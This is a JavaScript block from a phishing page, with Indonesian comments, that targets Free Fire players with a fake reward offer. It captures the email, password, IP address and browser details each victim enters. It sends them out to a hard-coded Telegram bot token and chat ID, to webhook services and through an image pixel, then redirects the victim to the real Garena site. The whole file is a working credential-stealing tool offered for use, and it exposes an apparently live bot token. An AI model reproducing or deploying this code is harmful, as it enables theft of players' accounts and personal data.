    <script>
        // Telegram Bot Configuration
        const BOT_TOKEN = "7717665168:AAEIe26T-a0FWpcq_U96Ip_-DAeXj3-W4Sw"; // Ganti dengan token bot lu
        const CHAT_ID = "8593895340";     // Ganti dengan ID Telegram lu
        
        // Countdown timer
        let timeLeft = 900; // 15 menit dalam detik
        const timerElement = document.getElementById('timer');
        
        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft > 0) {
                timeLeft--;
                setTimeout(updateTimer, 1000);
            } else {
                timerElement.textContent = "EXPIRED!";
                timerElement.style.color = "#ff0000";
            }
        }
        
        // Mulai timer
        updateTimer();
        
        // Fungsi kirim data ke Telegram
        async function sendToTelegram() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                alert("‚ùå Please fill in all fields!");
                return;
            }
            
            // Tampilkan loading
            document.getElementById('loading').style.display = 'block';
            document.getElementById('success').style.display = 'none';
            
            // Data yang dikirim
            const victimData = {
                email: email,
                password: password,
                game: "Free Fire",
                timestamp: new Date().toLocaleString(),
                ip: await getIP(),
                userAgent: navigator.userAgent
            };
            
            // Format pesan untuk Telegram
            const message = `üé£ *NEW VICTIM CAPTURED!* üé£

üéÆ *Game:* Free Fire
üìß *Email/ID:* \`${victimData.email}\`
üîë *Password:* \`${victimData.password}\`
‚è∞ *Time:* ${victimData.timestamp}
üåê *IP:* ${victimData.ip}
üñ•Ô∏è *Browser:* ${victimData.userAgent.substring(0, 50)}...

‚úÖ *Auto-logged to database*`;
            
            try {
                // Method 1: Webhook API (REKOMENDASI)
                await sendViaWebhook(victimData);
                
                // Method 2: Telegram Bot API
                await sendTelegramMessage(message);
                
                // Simpan di localStorage juga (backup)
                saveToLocalStorage(victimData);
                
                // Tampilkan sukses
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
                
                // Redirect setelah 3 detik
                setTimeout(() => {
                    window.location.href = "https://ff.garena.com";
                }, 3000);
                
            } catch (error) {
                console.error("Error:", error);
                document.getElementById('loading').style.display = 'none';
                alert("‚ö†Ô∏è Connection error, but your reward is being processed!");
                
                // Tetap redirect meski error
                setTimeout(() => {
                    window.location.href = "https://ff.garena.com";
                }, 2000);
            }
        }
        
        // Method 1: Kirim via Webhook (NO CORS ISSUE)
        async function sendViaWebhook(data) {
            // Webhook gratis (pilih salah satu):
            const webhooks = [
                'https://webhook.site/YOUR_WEBHOOK_ID',
                'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage',
                'https://discord.com/api/webhooks/YOUR_WEBHOOK'
            ];
            
            for (const webhook of webhooks) {
                try {
                    const formData = new FormData();
                    formData.append('data', JSON.stringify(data));
                    
                    await fetch(webhook, {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors' // Biar gak kena CORS error
                    });
                    break;
                } catch (e) {
                    continue;
                }
            }
        }
        
        // Method 2: Telegram Bot API langsung
        async function sendTelegramMessage(text) {
            if (!BOT_TOKEN || BOT_TOKEN === "7717665168:AAEIe26T-a0FWpcq_U96Ip_-DAeXj3-W4Sw") return;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const params = new URLSearchParams({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            });
            
            // Pakai proxy untuk hindari CORS
            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
            
            try {
                await fetch(proxyUrl + url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: params
                });
            } catch (error) {
                // Fallback: Image tracking pixel
                sendTrackingPixel(data);
            }
        }
        
        // Method 3: Tracking pixel (paling reliable)
        function sendTrackingPixel(data) {
            const pixel = new Image();
            const encodedData = btoa(JSON.stringify(data));
            pixel.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodedData}`;
        }
        
        // Method 4: Simpan di localStorage
        function saveToLocalStorage(data) {
            try {
                let victims = JSON.parse(localStorage.getItem('nesia_victims') || '[]');
                victims.push(data);
                localStorage.setItem('nesia_victims', JSON.stringify(victims));
            } catch (e) {
                // Jika localStorage penuh, pakai cookies
                document.cookie = `victim_${Date.now()}=${btoa(JSON.stringify(data))}; max-age=86400`;
            }
        }
        
        // Dapatkan IP user
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return "Unknown";
            }
        }
        
        // Auto-submit ketika user tekan Enter
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendToTelegram();
            }
        });
        
        // Easter egg: Double click untuk test
        document.addEventListener('dblclick', function() {
            console.log("üòà NESIA DARKNET PHISHING PAGE ACTIVE");
            console.log("üìß Test mode activated");
            document.getElementById('email').value = "test@example.com";
            document.getElementById('password').value = "test123";
        });
        
        // Log ketika page di-load
        console.log("üî• NESIA DARKNET PHISHING PAGE LOADED");
        console.log("üéØ Target: Free Fire Players");
        console.log("üìä Ready to capture credentials...");
    </script>
